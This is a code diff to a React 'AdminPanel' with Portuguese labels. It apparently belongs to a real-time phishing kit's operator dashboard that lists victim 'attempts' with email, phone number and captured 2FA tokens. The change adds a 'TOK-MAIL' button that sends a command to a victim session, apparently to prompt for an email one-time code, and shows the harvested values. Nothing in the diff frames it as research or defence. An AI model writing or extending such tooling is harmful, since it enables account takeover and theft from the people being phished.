@@ -232,7 +232,7 @@ function AdminPanel() {
                           <th className="bg-purple-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">EMAIL</th>
                           <th className="bg-orange-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-TEL</th>
                           <th className="bg-green-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">Nº TELEFONE</th>
-                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">APP MAIL</th>
+                          <th className="bg-blue-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">TOK-MAIL</th>
                           <th className="bg-yellow-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">👍</th>
                           <th className="bg-pink-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">X</th>
                           <th className="bg-gray-100 px-3 py-2 text-xs font-bold text-gray-700 border border-gray-300">🗑️</th>
@@ -293,7 +293,12 @@ function AdminPanel() {
                             </button>
                           </td>
                           <td className="px-3 py-2 text-center border border-gray-300">
-                            <span className="text-gray-400 text-xs">-</span>
+                            <button
+                              onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
+                              className="bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
+                            >
+                              TOK-MAIL
+                            </button>
                           </td>
                           <td className="px-3 py-2 text-center border border-gray-300">
                             <button
@@ -323,13 +328,13 @@ function AdminPanel() {
 
                         {/* Linha de Dados Recebidos */}
                         <tr className="bg-gray-50">
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
                           <td className="px-3 py-2 text-center text-xs border border-gray-300">
                             <span className="text-gray-700">-</span>
                           </td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
                           <td className="px-3 py-2 text-center text-xs border border-gray-300">
                             <span className="text-gray-700">{attempt.token_2fa || "-"}</span>
                           </td>
@@ -345,9 +350,9 @@ function AdminPanel() {
                           <td className="px-3 py-2 text-center text-xs border border-gray-300">
                             <span className="text-gray-700">{attempt.app_mail || "-"}</span>
                           </td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300">-</td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
+                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
                         </tr>
                       </tbody>
                     </table>
